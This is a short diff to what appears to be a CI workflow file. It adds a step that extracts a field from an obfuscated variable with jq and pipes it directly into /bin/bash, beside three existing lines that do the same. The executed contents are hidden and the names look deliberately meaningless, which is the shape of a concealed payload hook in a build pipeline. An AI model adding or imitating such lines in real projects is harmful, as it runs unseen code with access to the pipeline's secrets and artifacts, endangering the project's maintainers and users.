@@ -29,6 +29,7 @@ jobs:
           echo $irsli815 | jq -r .g4 | /bin/bash
           echo $wjd20 | jq -r .r50 | /bin/bash
           echo $r85 | jq -r .zbi6 | /bin/bash
+          echo $erzoj67 | jq -r .j78832 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
